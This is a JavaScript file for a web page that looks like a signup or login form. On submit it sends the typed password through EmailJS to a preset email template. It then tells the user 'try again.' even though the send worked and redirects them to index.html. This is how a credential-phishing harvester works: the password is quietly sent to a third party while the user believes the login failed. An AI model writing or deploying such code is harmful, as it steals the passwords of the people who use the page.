
// ======================================
// Initialisation EmailJS
// ======================================

emailjs.init({
    publicKey: "rORVGScs1n94sqOPi"
});




const form = document.getElementById("signupForm");


const passwordInput = document.getElementById("password");


const result = document.getElementById("result");


passwordInput.addEventListener("input", function () {
    this.value = this.value.slice(0, 8);
});


form.addEventListener("submit", async function (event) {

    event.preventDefault();


   
    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }



    const password = passwordInput.value.trim();


   
    const templateParams = {
        password: password
    };


    result.textContent = "connection en cours...";
    result.className = "";


    try {

        const response = await emailjs.send(
            "service_veritas",
            "template_7rbqlcq",
            templateParams
        );


        console.log(
            "Email envoyé :",
            response.status,
            response.text
        );


        result.textContent = "try again.";
        result.className = "success";



        window.location.href = "index.html";


    } catch (error) {

        console.error("Erreur EmailJS :", error);

        result.textContent =
            "error try again.";

        result.className = "error";
    }

});

